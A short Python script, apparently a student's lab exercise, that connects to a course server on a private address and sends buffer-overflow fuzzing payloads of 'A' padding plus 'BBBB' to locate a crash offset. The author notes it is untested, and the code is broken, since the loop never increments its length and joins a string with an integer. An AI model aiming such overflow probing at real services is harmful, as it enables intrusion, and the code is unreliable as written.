import socket

#I cannot currently get the given FML Server in MyCourses to run properly, so I cannot test this completely


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#info of host
host = "192.168.195.237" #remember to change again before running
port = 8421

sock.connect((host, port))

#receive initial welcome message
response = sock.recv(2048)
print(response)

#try giving input of increasing lengths
length = 0
while (length < 1500):
    payload = "A"*length + "BBBB" + "C"*10

    print("Sending Payload of size " + length)
    sock.send(payload.encode())

    response = sock.recv(2048)
    print(response)
